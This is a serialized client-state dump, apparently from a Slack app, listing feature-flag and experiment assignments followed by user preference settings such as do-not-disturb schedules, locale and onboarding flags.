experiment_id"864161417379"type"team"group"olap"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"email_bridge_tick_for_threadso"
experiment_id"876731611591"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"shared_channels_new_user_trialo"
experiment_id"881337382343"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"phase3_email_template_revisito"
experiment_id"900698809972"type"team"group"open"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"partner_promoso"
experiment_id"904475784116"type"team"group"control"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"fair_billing_dunning_statementso"
experiment_id"917465136692"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"ios_native_calls_callkit_servero"
experiment_id"918963880356"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"dunning_auto_downgradeo"
experiment_id"919867655840"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{""autoclog_checkout_plans_parity_poco"
experiment_id"921362305157"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"vitess_messages_use_replicaso"
experiment_id"929272253780"type"team"group"replica"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"desktop_anchor_texto"
experiment_id"933499045927"type"team"group"	treatment"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"user_invites_bulk_asynco"
experiment_id"947842576311"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"insights_murron_loggingo"
experiment_id"953779787265"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"shared_channels_inviter_trialo"
experiment_id"957220846595"type"team"group"control"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"google_directoryo"
experiment_id"959154385427"type"team"group"	treatment"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"calls_free_willyo"
experiment_id"960682042512"type"team"group"enabled"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"tenured_teams_discount_promo_v3o"
experiment_id"961632669539"type"team"group"treatment30"trigger"	hash_team"
log_exposuresT"exposure_idN ` î4ÄtB{"-desktop_release_alpha_win32_4___5___0__alpha1o"
experiment_id"965566966754"type"team"group"receives_desktop_update"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{".desktop_release_alpha_darwin_4___5___0__alpha1o"
experiment_id"968254564929"type"team"group"receives_desktop_update"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"shared_channels_home_reminderso"
experiment_id"969089002528"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"maurerpower_test_4o"
experiment_id"971299781414"type"team"group"	treatment"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"partner_promo_v2o"
experiment_id"972551924087"type"team"group"control"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{" shared_channels_inviter_trial_aao"
experiment_id"992472666677"type"team"group" "trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"ia_ga_new_teamso"
experiment_id"996474299060"type"team"group"	treatment"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"
newxp_4153o"
experiment_id"997413419104"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"$plans_page_highlight_shared_channelso"
experiment_id"998983020660"type"team"group"control"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"files_index_name_edgengramo"
experiment_id"
1005618859430"type"team"group"index"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"+thread_subscription_user_cache_writethrougho"
experiment_id"
1007829410416"type"team"group"	treatment"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"ie_896o"
experiment_id"
1010125238720"type"team"group"holdout_test"trigger"	hash_team"
log_exposuresT"exposure_idN ` î4ÄtB{"shared_channels_90_day_trial_bbo"
experiment_id"
1017543768374"type"team"group"	treatment"trigger"	hash_team"
log_exposuresT"exposure_idN ` î4ÄtB{"stripe_billing_darko"
experiment_id"
1020525130948"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"simple_invite_modalo"
experiment_id"
1020922842880"type"team"group"control"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"dnd_skip_exit_msgo"
experiment_id"
1022751509984"type"team"group"receive_msg"trigger"	hash_team"
log_exposuresT"exposure_idN ` î4ÄtB{"shared_channels_email_inviteo"
experiment_id"
1023997682304"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"$api_subs_thread_get_view_lower_limito"
experiment_id"
1024776404103"type"team"group"lower_limit"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{" users_invites_bulk_async_for_allo"
experiment_id"
1024863393383"type"team"group"
treatment1"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"threads_use_distinct_querieso"
experiment_id"
1025136081574"type"team"group"	treatment"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"remove_custom_invite_messageo"
experiment_id"
1027973394598"type"team"group"control"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"golden_gate_v3o"
experiment_id"
1030482144210"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"bridge_phase_3_reply_style_pluso"
experiment_id"
1034687787879"type"team"group"button"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"emoji_packso"
experiment_id"
1037699998497"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"&paperclip_coachmark_for_file_app_userso"
experiment_id"
1039464803749"type"team"group"no_coachmark"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"ocal_delegated_autho"
experiment_id"
1047135922135"type"team"group"	treatment"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"/dnd_do_not_propogate_team_pref_changes_to_userso"
experiment_id"
1047951946688"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"shared_channels_shortcuto"
experiment_id"
1048915980354"type"team"group"verbose"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"!plans_checkout_apps_consolidationo"
experiment_id"
1050029453287"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{")vifl_explicit_order_teams_channels_sharedo"
experiment_id"
1052610214212"type"team"group"
order_desc"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"shortcuts_menu_blank_slateo"
experiment_id"
1055485467813"type"team"group"	treatment"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"reacji_the_alarmo"
experiment_id"
1057995181937"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"threads_get_view_asynco"
experiment_id"
1059528295975"type"team"group"	treatment"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"backfill_invitation_mentionso"
experiment_id"
1059731914327"type"team"group"	treatment"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"tenured_teams_discount_promo_v4o"
experiment_id"
1068083183554"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"'fair_billing_backend_refactor_dark_modeo"
experiment_id"
1068563745540"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"$desktop_release_beta_win32_4___5___0o"
experiment_id"
1069669795942"type"team"group"receives_desktop_update"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"android_min_app_version_piloto"
experiment_id"
1071011859089"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"gcal_delegated_autho"
experiment_id"
1072650701185"type"team"group"	treatment"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"%desktop_release_beta_darwin_4___5___0o"
experiment_id"
1075023583685"type"team"group"receives_desktop_update"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"%desktop_release_prod_darwin_4___5___0o"
experiment_id"
1080261057234"type"team"group"receives_desktop_update"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"-vitess_flannel_channel_encode_user_query_modeo"
experiment_id"
1085831468450"type"team"group"olap"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"$desktop_release_prod_win32_4___5___0o"
experiment_id"
1104102626704"type"team"group"receives_desktop_update"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"shared_channels_away_reminderso"
experiment_id"
1104574474145"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"+desktop_release_eta_win32_4___7___0__alpha1o"
experiment_id"
1108322324231"type"team"group"receives_desktop_update"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{".desktop_release_alpha_darwin_4___7___0__alpha1o"
experiment_id"
1108322337655"type"team"group"receives_desktop_update"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"google_drive_auths_experimento"
experiment_id"
1114403625713"type"team"group"current_unauth_experience"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"mmts_unreads_for_joinerso"
experiment_id"
1117265546387"type"team"group"	treatment"trigger"	hash_team"
log_exposuresT"exposure_idN ` î4ÄtB{",desktop_release_eta_darwin_4___7___0__alpha1o"
experiment_id"
1123273241955"type"team"group"receives_desktop_update"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"bulk_invites_async_allo"
experiment_id"
1125735563985"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"corey_test_experimento"
experiment_id"
1134643641286"type"team"group"	treatment"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"tenured_teams_discount_promo_v5o"
experiment_id"
1134798757638"type"team"group"treatment50"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"-desktop_release_alpha_win32_4___7___0__alpha1o"
experiment_id"
1135686950273"type"team"group"receives_desktop_update"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"free_team_group_calls_discoveryo"
experiment_id"
1139983250918"type"team"group"trial_and_prompt"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"newxp_4249_expo"
experiment_id"
1141613290864"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"paid_feature_ssoo"
experiment_id"
1144616308710"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"seu_email_bridge_inviteo"
experiment_id"
1158321853651"type"team"group"invite"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"seu_email_bridge_org_usero"
experiment_id"
1159878924199"type"team"group"seu_email_bridge"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"
test_tierso"
experiment_id"
1175229158195"type"team"group"control"trigger"	hash_team"
log_exposuresT"exposure_idN ` î4ÄtB{"(shared_channels_90_day_trial_existing_bbo"
experiment_id"
1175884951297"type"team"group"control"trigger"	hash_team"
log_exposuresT"exposure_idN ` î4ÄtB{"tika_ocro"
experiment_id"
1177258635125"type"team"group"	treatment"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"paid_team_group_calls_discoveryo"
experiment_id"
1184201624609"type"team"group"control"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{""shared_channels_multi_email_inviteo"
experiment_id"
1189609788804"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"!files_serve_lib_s3_php_unbufferedo"
experiment_id"
1189653965765"type"team"group"	treatment"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"calls_api_mods_teamo"
experiment_id"
1194091734324"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"shared_channels_content_v2o"
experiment_id"
1218421688563"type"team"group"control"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"workflows_gantry_v2o"
experiment_id"
1223376137504"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"two_factor_auth_featureo"
experiment_id"
1232681762130"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"%checkout_zip_completes_city_and_stateo"
experiment_id"
1238156384753"type"team"group"control"trigger"	hash_team"
log_exposuresT"exposure_idN ` î4ÄtB{"create_channel_from_composero"
experiment_id"
1245049517927"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"&remove_activation_message_limit_bannero"
experiment_id"
1250620054580"type"team"group"control"trigger"	hash_team"
log_exposuresT"exposure_idN ` î4ÄtB{"sidebar_checkout_linko"
experiment_id"
1254889711142"type"team"group"control"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"files_from_replica_in_convo"
experiment_id"
1260758622243"type"team"group"	treatment"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{",desktop_release_eta_darwin_4___9___0__alpha1o"
experiment_id"
1263306920884"type"team"group"receives_desktop_update"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"+desktop_release_eta_win32_4___9___0__alpha1o"
experiment_id"
1269746298385"type"team"group"receives_desktop_update"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"workflows_admin_list_v2o"
experiment_id"
1272187525111"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{".desktop_release_alpha_darwin_4___9___0__alpha3o"
experiment_id"
1273561153138"type"team"group"receives_desktop_update"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"-desktop_release_alpha_win32_4___9___0__alpha3o"
experiment_id"
1273767395251"type"team"group"receives_desktop_update"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{".desktop_release_alpha_darwin_4___9___0__alpha4o"
experiment_id"
1282757447077"type"team"group"receives_desktop_update"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"-desktop_release_alpha_darwin_4___9___0__beta1o"
experiment_id"
1283190851287"type"team"group"receives_desktop_update"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"ie_1430o"
experiment_id"
1291473072631"type"team"group"control"trigger"	hash_team"
log_exposuresT"exposure_idN ` î4ÄtB{",desktop_release_beta_darwin_4___9___0__beta2o"
experiment_id"
1293038996550"type"team"group"receives_desktop_update"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{""search_files_indexing_dual_clustero"
experiment_id"
1293320620677"type"team"group"	treatment"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"+desktop_release_beta_win32_4___9___0__beta1o"
experiment_id"
1293949331893"type"team"group"receives_desktop_update"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{",desktop_release_beta_darwin_4___9___0__beta1o"
experiment_id"
1295321128066"type"team"group"receives_desktop_update"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"slackbot_custom_response_cacheo"
experiment_id"
1296732454503"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"-desktop_release_alpha_win32_4___9___0__alpha4o"
experiment_id"
1296754772881"type"team"group"receives_desktop_update"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"+desktop_release_beta_win32_4___9___0__beta2o"
experiment_id"
1298397709141"type"team"group"receives_desktop_update"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"
day1_convoo"
experiment_id"
1305212834913"type"team"group"control"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{",desktop_release_alpha_win32_4___9___0__beta1o"
experiment_id"
1310559202561"type"team"group"receives_desktop_update"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"emoji_cacheo"
experiment_id"
1312276576612"type"team"group"	treatment"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"+desktop_release_beta_win32_4___9___0__beta3o"
experiment_id"
1316495771398"type"team"group"receives_desktop_update"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{",shared_channels_home_admin_implicit_approvalo"
experiment_id"
1322991014131"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{""lc_msg_limit_banner_upgrd_1131_bugo"
experiment_id"
1325814397234"type"team"group"control"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"edu_101o"
experiment_id"
1326005479860"type"team"group"control"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"trial_end_users_copy_refresho"
experiment_id"
1327809305827"type"team"group"new_email_flow"trigger"	hash_team"
log_exposuresT"exposure_idN ` î4ÄtB{"post_trial_discount_promo_v1o"
experiment_id"
1328467966786"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"ie_1516_download_appo"
experiment_id"
1328692532659"type"team"group"control"trigger"	hash_team"
log_exposuresT"exposure_idN ` î4ÄtB{"trial_email_lifecycle_revamp_v2o"
experiment_id"
1330245964450"type"team"group"	treatment"trigger"	hash_team"
log_exposuresT"exposure_idN ` î4ÄtB{"vitess_dark_item_subso"
experiment_id"
1332977731281"type"team"group"vitess"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"#insights_member_analytics_api_piloto"
experiment_id"
1334714483953"type"team"group"	treatment"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{",desktop_release_beta_darwin_4___9___0__beta3o"
experiment_id"
1335852281249"type"team"group"receives_desktop_update"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"(discovery_conversations_edits_perf_boosto"
experiment_id"
1339347637602"type"team"group"	treatment"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"ce_consults_trialso"
experiment_id"
1340568170420"type"team"group"no_email"trigger"	hash_team"
log_exposuresT"exposure_idN ` î4ÄtB{"calls_chime_readiness_checko"
experiment_id"
1343782115461"type"team"group"enabled"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{" paid_benefits_disable_footer_ctao"
experiment_id"
1343909921143"type"team"group"	treatment"trigger"	hash_team"
log_exposuresT"exposure_idN ` î4ÄtB{"first_message_notificationo"
experiment_id"
1344623428546"type"team"group"	treatment"trigger"	hash_team"
log_exposuresT"exposure_idN ` î4ÄtB{"new_onboarding_email_flowo"
experiment_id"
1346554136769"type"team"group"	no_emails"trigger"	hash_team"
log_exposuresT"exposure_idN ` î4ÄtB{"extend_slack_connecto"
experiment_id"
1348129849447"type"team"group"	treatment"trigger"	hash_team"
log_exposuresT"exposure_idN ` î4ÄtB{"'team_billable_info_fetch_users_directlyo"
experiment_id"
1353359388405"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{"trial_benefits_awarenesso"
experiment_id"
1353891122343"type"team"group"modal"trigger"	hash_team"
log_exposuresT"exposure_idN ` î4ÄtB{"day1_joiner_notificationso"
experiment_id"
1355065566197"type"team"group"	treatment"trigger"	hash_team"
log_exposuresT"exposure_idN ` î4ÄtB{"channel_email_addresses_admino"
experiment_id"
1355793758390"type"team"group"	treatment"trigger"finished"
log_exposuresF"exposure_idN ` î4ÄtB{" vifl_ibm_query_perf_improvementso"
experiment_id"
1362640712772"type"team"group"enabled"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{" threads_c14n_queries_no_overrideo"
experiment_id"
1368489116949"type"team"group"	treatment"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"shared_channels_trial_eduo"
experiment_id"
1370971918786"type"team"group"control"trigger"	hash_team"
log_exposuresT"exposure_idN ` î4ÄtB{"notifications_tracingo"
experiment_id"
1371924029668"type"team"group"	treatment"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"redeprecate_pins_add_fileo"
experiment_id"
1377404756722"type"team"group"	treatment"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{",desktop_release_beta_win32_4___10___0__beta2o"
experiment_id"
1379958140693"type"team"group"receives_desktop_update"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"thread_replies_no_olapo"
experiment_id"
1381469603921"type"team"group"	treatment"trigger"	hash_team"
log_exposuresT"exposure_idN ` î4ÄtB{"ie_1590o"
experiment_id"
1386777590641"type"team"group"control"trigger"	hash_team"
log_exposuresT"exposure_idN ` î4ÄtB{"-desktop_release_beta_darwin_4___10___0__beta2o"
experiment_id"
1395676501153"type"team"group"receives_desktop_update"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"trial_end_modalo"
experiment_id"
1396500998545"type"team"group"social_proof"trigger"	hash_team"
log_exposuresT"exposure_idN ` î4ÄtB{"trial_incentive_emailo"
experiment_id"
1399572413303"type"team"group"no_email"trigger"	hash_team"
log_exposuresT"exposure_idN ` î4ÄtB{"'discovery_conversations_list_perf_boosto"
experiment_id"
1405092736564"type"team"group"	treatment"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"!cs_scale_workflow_steps_from_appso"
experiment_id"
1407295728372"type"team"group"	treatment"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"itemsubs_lastread_fetcho"
experiment_id"
1409931201478"type"team"group"	treatment"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"i18n_toast_ko_kro"
experiment_id"
1419684745075"type"team"group"	treatment"trigger"launch_team"
log_exposuresF"exposure_idN ` î4ÄtB{"edu_187o"
experiment_id"
1429869184688"type"team"group"control"trigger"	hash_team"
log_exposuresT"exposure_idN ` î4ÄtB{{‰"fileRefresho{ "
filesFlexpaneo"filetype" "user" "
scrollmark0"filesa @  {"	endpointso"flannelOverHttpo"url"+https://edgeapi.slack.com/cache/T01CK1QBDDL"expiryN  ?_UwB"error_"promise_{{ch e l p o"issueso{ {"importso{ "informationBarrierso"informationBarriersa @  {"inlineFilePreviewso"fileso{ "	expandingo{ {"inviteso"externalDirectoryViewReferrerIH"
inviteType0"isAddingFromExternalDirectoryF"
requestReason0"
unsentInvitesa @  "unsentGroupsa @  {"lastUsedSlashCommando{ "linkso{ "memberDirectoryFlexpaneo"searchQuery" "
scrollmark0"marker" "	memberIdsa @  "nonExactMatchMemberIdsa @  "filter"people{"messageEdito{ "messagePaneo"	channelId"C01CNNCJELV"startTs0"highlightTs"27"
highlightLazy_"highlightsBackButtonVisibleF"userSetUnreadPointF"unreadLineVisibleT"
ghostLastRead0"scrollmarkso"C01CRP755V00"D01CNM69G3F0"D01CXUJNBS80"C01CNNCJELV0{"overlayVisibleF"
prevChannelId"D01CNM69G3F"prevChannelSwitchTs"
1602860565.29"newxpOnboardingStep0"hasMessagePaneUnmountedT"isAppSpaceOpenF"focusRequestedTs_" focusLastVisibleMessageInChannel_"focusMessageInput_"showingMentionTipF"focusMentionTipF"hasClickedCustomStatusTipF"quickReactionsTipViewCountI "
startTsOffset_{"modalo"lastUpdatedN  löSwB{"pendingOpenChannelo{ "permissionso"orgso{ "teamso{ "channelso{ {"prefso"usero"user_colors" "color_names_in_listT"keyboard0"email_alerts"instant"email_alerts_sleep_untilI "
email_tipsT"email_weeklyT"email_offersT"email_researchT"email_developerT"welcome_message_hiddenF"search_sort"not_set"search_file_sort"score"search_channel_sort"relevant"search_people_sort"relevant"expand_inline_imgsT"expand_internal_inline_imgsT"expand_snippetsF"posts_formatting_guideT"seen_welcome_2F"seen_ssb_promptF"spaces_new_xp_banner_dismissedF"search_only_my_channelsF"search_only_current_teamF"search_hide_my_channelsF"search_only_show_onlineF"search_hide_deactivated_usersF"
emoji_mode"default"	emoji_useo{ "
emoji_use_org" "has_invitedF"has_uploadedF"has_created_channelT"has_created_channel_sectionF"has_searchedF"has_installed_apps0"search_exclude_channels" "messages_theme"default"webapp_spellcheckT"no_joined_overlaysF"no_created_overlaysF"dropbox_enabledF"seen_domain_invite_reminderF"seen_member_invite_reminderF"mute_soundsF"
arrow_historyF"tab_ui_return_selectsT"obey_inline_img_limitT"
require_atF"ssb_space_window" "mac_ssb_bounce" "mac_ssb_bulletT"expand_non_media_attachmentsT"show_typingT"pagekeys_handledT"last_snippet_type" "display_real_names_overrideI "display_display_namesT"time24T"enter_is_special_in_tbtF"msg_input_send_btnF"msg_input_send_btn_auto_setF"msg_input_sticky_composerT"graphic_emoticonsF"convert_emoticonsT"	ss_emojisT"seen_onboarding_startF"onboarding_cancelledF"%seen_onboarding_slackbot_conversationF"seen_onboarding_channelsF"seen_onboarding_direct_messagesF"seen_onboarding_invitesF"seen_onboarding_searchF"seen_onboarding_recent_mentionsF"seen_onboarding_starred_itemsF"seen_onboarding_private_groupsF"seen_onboarding_bannerF"%onboarding_slackbot_conversation_stepI "set_tz_automaticallyT"suppress_link_warningF".suppress_external_invites_from_compose_warningF"seen_emoji_pack_ctaI "seen_emoji_pack_dialogF"&emoji_packs_most_recent_available_timeN  €–á×A"emoji_packs_clicked_picker_ctaF""emoji_packs_clicked_collection_ctaF"dnd_enabledT"dnd_start_hour"22:00"dnd_end_hour"8:00"dnd_before_monday"8:00"dnd_after_monday"22:00"dnd_enabled_monday"partial"dnd_before_tuesday"8:00"dnd_after_tuesday"22:00"dnd_enabled_tuesday"partial"dnd_before_wednesday"8:00"dnd_after_wednesday"22:00"dnd_enabled_wednesday"partial"dnd_before_thursday"8:00"dnd_after_thursday"22:00"dnd_enabled_thursday"partial"dnd_before_friday"8:00"dnd_after_friday"22:00"dnd_enabled_friday"partial"dnd_before_saturday"8:00"dnd_after_saturday"22:00"dnd_enabled_saturday"partial"dnd_before_sunday"8:00"dnd_after_sunday"22:00"dnd_enabled_sunday"partial"dnd_days"	every_day"dnd_weekdays_off_alldayF"dnd_custom_new_badge_seenF"(dnd_notification_schedule_new_badge_seenF"unread_collapsed_channels0"xws_unread_collapsed_channels0"calls_survey_last_seen" "sidebar_behavior" "channel_sort"default"separate_private_channelsF"separate_shared_channelsT"
sidebar_theme"default"sidebar_theme_custom_values" "no_invites_widget_in_sidebarF"no_omnibox_in_channelsF"k_key_omnibox_auto_hide_countI "!show_sidebar_quickswitcher_buttonF"ent_org_wide_channels_sidebarT"mark_msgs_read_immediatelyT"start_scroll_at_oldestT"snippet_editor_wrap_long_linesF"ls_disabledF"f_key_searchF"
k_key_omniboxT"prompted_for_email_disablingF"no_macelectron_bannerF"no_macssb1_bannerF"no_macssb2_bannerF"no_winssb1_bannerF"hide_user_group_info_paneF"mentions_exclude_at_user_groupsF"mentions_exclude_reactionsF"privacy_policy_seenT"enterprise_migration_seenT"last_tos_acknowledged"tos_mar2018"search_exclude_botsF"load_lato_2F"fuller_timestampsF"last_seen_at_channel_warningI "emoji_autocomplete_bigF"two_factor_auth_enabledF"two_factor_type0"two_factor_backup_type0"hide_hex_swatchF"show_jumper_scoresF"enterprise_mdm_custom_msg" "enterprise_excluded_app_teams0"client_logs_pri" "flannel_server_pool"random"mentions_exclude_at_channelsT"confirm_clear_all_unreadsT"confirm_user_marked_awayT"box_enabledF"seen_single_emoji_msgF"confirm_sh_call_startT"preferred_skin_tone" "show_all_skin_tonesF"whats_new_readN  @Élâ×A"help_modal_open_timestampI "#help_modal_consult_banner_dismissedF"frecency_jumpero" o"id"MAdelete"countI"visitsAN ð‚wSwBN @ÕÃSwB$ {"MAdeleteo"id"MAdelete"countI"visitsAN ð‚wSwBN @ÕÃSwB$ {{"frecency_ent_jumpero{ "frecency_ent_jumper_backup" "	jumbomojiT"newxp_seen_last_messageI "show_memory_instrumentF"enable_unread_viewF"seen_unread_view_coachmarkF"seen_connect_dm_coachmarkF"enable_react_emoji_pickerT"seen_custom_status_badgeF"seen_custom_status_calloutF"#seen_custom_status_expiration_badgeF"used_custom_status_kb_shortcutF"&seen_guest_admin_slackbot_announcementF" seen_threads_notification_bannerF"seen_name_tagging_coachmarkF"all_unreads_sort_order" "all_unreads_section_filter" "locale"en-GB"!seen_intl_channel_names_coachmarkF"#seen_p3_locale_change_message_ko_krN 0qôSwB"seen_locale_change_messageI "#seen_japanese_locale_change_messageF"seen_shared_channels_coachmarkF"*seen_shared_channels_opt_in_change_messageF"has_recently_shared_a_channelF"$seen_channel_browser_admin_coachmarkF"seen_administration_menuF"seen_drafts_section_coachmarkF"#seen_emoji_update_overlay_coachmarkF"seen_sonic_deluxe_toastI "seen_wysiwyg_deluxe_toastF"seen_markdown_paste_toastI "seen_markdown_paste_shortcutI "seen_ia_educationF"show_ia_tour_relaunchI "plain_text_modeF"%show_shared_channels_education_bannerT" ia_slackbot_survey_timestamp_48hN  @Êlâ×A"ia_slackbot_survey_timestamp_7dI "!allow_calls_to_set_current_statusT"!in_interactive_mas_migration_flowF" sunset_interactive_message_viewsI "shdep_promo_code_submittedF"seen_shdep_slackbot_messageF" seen_calls_interactive_coachmarkF"allow_cmd_tab_issF"join_calls_device_settings"${"microphone": "on", "camera":"off"}""seen_workflow_builder_deluxe_toastF",workflow_builder_intro_modal_clicked_throughF"workflow_builder_coachmarks"{}"seen_gdrive_coachmarkF"seen_first_install_coachmarkF"seen_existing_install_coachmarkF"seen_link_unfurl_coachmarkF"file_picker_variantI "huddles_variantI "xws_sidebar_variantI "inbox_views_workspace_filter"all"overloaded_message_enabledT"seen_highlights_coachmarkF" seen_highlights_arrows_coachmarkF"seen_highlights_warm_welcomeF"seen_new_search_uiF"seen_channel_searchF"seen_people_searchT"seen_people_search_countI "%dismissed_scroll_search_tooltip_countI ".last_dismissed_scroll_search_tooltip_timestampI "has_used_quickswitcher_shortcutF"%seen_quickswitcher_shortcut_tip_countI 